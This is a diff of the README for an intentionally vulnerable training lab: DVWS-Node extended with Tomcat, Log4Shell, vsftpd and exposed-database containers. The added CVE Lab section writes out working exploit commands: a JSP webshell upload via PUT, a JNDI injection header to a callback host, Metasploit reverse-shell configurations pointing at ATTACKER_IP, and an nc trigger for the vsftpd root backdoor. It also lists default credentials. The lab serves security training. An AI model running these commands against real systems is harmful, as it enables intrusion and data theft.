@@ -1,27 +1,32 @@
-# DVWS-Node -- Damn Vulnerable Web Services
+# DVWS-Node + CVE Lab -- Vulnerable Target Environment
 
-Modern Node.js vulnerable application with REST, SOAP, GraphQL, and XML-RPC attack surfaces. 32 vulnerability categories across MySQL + MongoDB databases.
+Modern Node.js vulnerable application (32 vuln categories) plus CVE Lab containers with real Metasploit-exploitable CVEs.
 
 > **WARNING**: Intentionally vulnerable -- for authorized testing only.
 
-## Tech Stack
+## Services (7 containers)
 
-| Component | Technology |
-|-----------|-----------|
-| Backend | Node.js, Express |
-| Databases | MySQL 8 + MongoDB 4.0.4 |
-| APIs | REST, SOAP, GraphQL (Apollo), XML-RPC |
-| Docs | Swagger UI (OpenAPI) |
-| Auth | JWT (intentionally weak: `alg:none` accepted, secret = `access`) |
+| Service | Port | Technology | Vulns |
+|---------|------|-----------|-------|
+| DVWS-Node REST + SOAP | 80 | Node.js, Express | SQLi, XXE, cmd injection, IDOR, etc. |
+| GraphQL Playground | 4000 | Apollo Server | IDOR, introspection, file write |
+| XML-RPC | 9090 | xmlrpc module | SSRF |
+| MySQL 8 | 3306 | MySQL 8.4 | Exposed, scannable |
+| MongoDB 4.0.4 | 27017 | MongoDB (2018) | No auth, known CVEs |
+| Tomcat 8.5.19 | 8080 | Apache Tomcat | CVE-2017-12617 (PUT RCE) |
+| Log4Shell | 8888 | Spring Boot + Log4j 2.14.1 | CVE-2021-44228 (JNDI RCE) |
+| vsftpd 2.3.4 | 21, 6200 | vsftpd | CVE-2011-2523 (backdoor shell) |
 
 ## Default Credentials
 
-| Username | Password | Role |
-|----------|----------|------|
-| `admin` | `letmein` | Admin |
-| `test` | `test` | Regular user |
+| Service | Username | Password | Role |
+|---------|----------|----------|------|
+| DVWS-Node | `admin` | `letmein` | Admin |
+| DVWS-Node | `test` | `test` | Regular user |
+| MySQL | `root` | `mysecretpassword` | Root |
+| MongoDB | -- | -- | No auth required |
 
-> Both databases are reset on every container restart (startup_script.js re-seeds).
+> DVWS-Node databases are reset on every container restart (startup_script.js re-seeds).
 
 ---
 
@@ -238,30 +243,94 @@ curl -s -X POST http://<IP>/api/upload \
 
 ---
 
+## CVE Lab -- Metasploit-Exploitable Services
+
+### CVE-2017-12617: Apache Tomcat PUT RCE (port 8080)
+
+Tomcat 8.5.19 with `readonly=false` on the DefaultServlet. Upload a JSP webshell via HTTP PUT.
+
+```bash
+# Upload a JSP shell via PUT
+curl -X PUT http://<IP>:8080/shell.jsp -d '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
+
+# Metasploit
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set RHOSTS <IP>
+set RPORT 8080
+set PAYLOAD java/jsp_shell_reverse_tcp
+set LHOST <ATTACKER_IP>
+exploit
+```
+
+### CVE-2021-44228: Log4Shell JNDI RCE (port 8888)
+
+Spring Boot app with Log4j 2.14.1. Inject `${jndi:ldap://...}` in any HTTP header.
+
+```bash
+# Test with interactsh callback
+curl http://<IP>:8888/ -H 'X-Api-Version: ${jndi:ldap://CALLBACK_HOST/a}'
+
+# Metasploit
+use exploit/multi/http/log4shell_header_injection
+set RHOSTS <IP>
+set RPORT 8888
+set TARGETURI /
+set HTTP_HEADER X-Api-Version
+set PAYLOAD java/shell_reverse_tcp
+set LHOST <ATTACKER_IP>
+exploit
+```
+
+### CVE-2011-2523: vsftpd 2.3.4 Backdoor (port 21 + 6200)
+
+Send a username ending in `:)` to trigger the backdoor, opening a root shell on port 6200.
+
+```bash
+# Metasploit (one-click root shell)
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <IP>
+exploit
+
+# Manual
+echo -e "USER attacker:)\nPASS anything" | nc <IP> 21 &
+nc <IP> 6200
+# id -> uid=0(root)
+```
+
+### Exposed Databases
+
+```bash
+# MongoDB 4.0.4 -- no authentication
+mongosh mongodb://<IP>:27017/node-dvws --eval "db.users.find()"
+
+# MySQL 8.4
+mysql -h <IP> -u root -pmysecretpassword -e "SELECT * FROM dvws_sqldb.passphrases"
+```
+
+---
+
 ## Architecture
 
 ```
-                 ATTACKER
-                    |
-      +-------------+-------------+
-      |             |             |
-   Port 80      Port 4000     Port 9090
-      |             |             |
-+-----v------+ +---v----+ +-----v------+
-| Express.js | | Apollo | | XML-RPC    |
-| REST API   | |GraphQL | | Server     |
-| SOAP       | |Playgr. | |            |
-| Swagger UI | |        | |            |
-+-----+------+ +---+----+ +-----+------+
-      |             |             |
-      +------+------+------+------+
-             |             |
-        +----v----+   +----v-----+
-        | MySQL 8 |   |MongoDB   |
-        | SQLi    |   |4.0.4     |
-        | targets |   |NoSQLi    |
-        +---------+   |Auth/Notes|
-                      +----------+
+                          ATTACKER
+                             |
+    +-------+-------+-------+-------+-------+-------+
+    |       |       |       |       |       |       |
+  :80     :4000   :9090   :8080   :8888    :21    :3306/:27017
+    |       |       |       |       |       |       |
++---v--+ +-v---+ +-v---+ +-v----+ +v----+ +v----+ +v--------+
+|REST  | |Graph| |XML  | |Tomcat| |Log4 | |vsFTP| |MySQL    |
+|SOAP  | |QL   | |RPC  | |8.5.19| |Shell| |2.3.4| |MongoDB  |
+|Swagg.| |     | |     | |      | |     | |     | |         |
++--+---+ +--+--+ +--+--+ +------+ +-----+ +-----+ +---------+
+   |        |        |     CVE-       CVE-    CVE-    Exposed
+   +---+----+---+----+     2017-      2021-   2011-   DBs
+       |        |           12617      44228   2523
+  +----v---+ +--v------+
+  |MySQL 8 | |MongoDB  |
+  |SQLi    | |4.0.4    |
+  |targets | |NoSQLi   |
+  +--------+ +---------+
 ```
 
 ---
@@ -270,7 +339,7 @@ curl -s -X POST http://<IP>/api/upload \
 
 | Setting | Value |
 |---------|-------|
-| **Path** | `/api/v2/info` |
+| **Path** | `/api/v1/info` |
 | **Port** | `80` |
 | **Protocol** | `HTTP` |
 | **Success codes** | `200` |
